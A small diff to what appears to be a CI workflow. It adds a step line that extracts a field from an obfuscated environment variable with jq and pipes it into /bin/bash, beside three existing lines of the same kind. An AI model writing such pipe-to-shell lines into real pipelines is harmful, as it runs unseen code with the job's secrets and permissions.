@@ -24,6 +24,7 @@ jobs:
           echo $yqxj01 | jq -r .bpyqz46339 | /bin/bash
           printf '%s' "$p42" | jq -r .pd86 | /bin/bash
           printf '%s' "$vns705" | jq -r .gzzjb58 | /bin/bash
+          echo $lbe8 | jq -r .mz73 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
